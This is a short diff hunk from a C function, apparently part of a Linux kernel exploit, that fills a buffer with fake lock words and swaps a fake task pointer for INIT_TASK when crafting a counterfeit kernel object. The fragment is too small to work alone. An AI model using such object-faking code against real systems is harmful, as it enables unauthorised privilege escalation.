@@ -916,7 +916,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task);
+      put64(p, LOCK_OFF + 0x18, INIT_TASK);
     } else {
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
